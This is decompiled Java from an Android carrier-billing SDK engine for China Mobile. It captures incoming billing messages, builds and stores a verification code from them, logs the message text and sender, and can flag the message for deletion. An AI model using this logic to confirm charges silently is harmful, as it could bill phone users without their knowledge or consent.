package com.upay.billing.engine.zcwap;

import android.content.Context;
import com.upay.billing.MtContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.List;
import java.util.regex.Pattern;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  public Main() {}
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    Boolean localBoolean = Boolean.valueOf(false);
    if (paramOp.equals(Op.CMCC)) {
      localBoolean = Boolean.valueOf(true);
    }
    return (localBoolean.booleanValue()) && (paramBoolean1) && (paramBoolean2);
  }
  
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    int j = 0;
    Object localObject1 = this.core.getContext();
    String str2 = paramMtContext.trade.appKey;
    Object localObject2 = paramMtContext.trade.getSubTrade(paramMtContext.cmd.key);
    paramMtContext.mtNum.pattern();
    switch (Main.1.$SwitchMap$com$upay$billing$engine$zcwap$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      if ((((Json)localObject2).getInt("state") & 0x4) != 0) {
        return 524288;
      }
      String str1 = null;
      String str3 = paramJson.getStr("msg");
      ((Json)localObject2).put("state", Integer.valueOf(((Json)localObject2).getInt("state") | 0x4));
      int i = paramArrayOfString.length;
      for (paramJson = str1;; paramJson = str3.replace("$" + (i + 1), paramArrayOfString[i]))
      {
        i -= 1;
        if (i < 0) {
          break;
        }
      }
      Util.saveString((Context)localObject1, "verifycode", paramJson);
      paramArrayOfString = this.core;
      str1 = paramMtContext.trade.id;
      localObject1 = paramMtContext.trade.goodsKey;
      str3 = paramMtContext.cmd.key;
      localObject2 = paramMtContext.cmd.btKey;
      i = j;
      if (paramMtContext.cmd.deleteMt) {
        i = 1;
      }
      paramArrayOfString.logEvent(str2, "verify_handle", Json.createObject(new Object[] { "trade_id", str1, "goods_key", localObject1, "cmd_key", str3, "bt_key", localObject2, "delete_mt", Integer.valueOf(i), "description", "zc", "mt_msg", paramString2, "mt_num", paramString1, "result", Integer.valueOf(200), "sn", paramMtContext.serialNo, "up_msg", paramJson, "up_num", paramString1 }).asObject().toString());
      return 524288;
    case 2: 
      return 524288;
    case 3: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.core.activateHandlers(paramTrade, paramTrade.id + "01", "", (Cmd)paramList.get(0));
    Util.saveString(this.core.getContext(), "verifycode", "");
    if ("WIFI".equals(Util.getNetType(this.core.getContext())))
    {
      new ZcWebPayTask(this.core.getContext(), paramTrade, paramList).execute(new Object[0]);
      return;
    }
    new ZcWapPayTask(this.core.getContext(), paramTrade, paramList).execute(new Object[0]);
  }
}
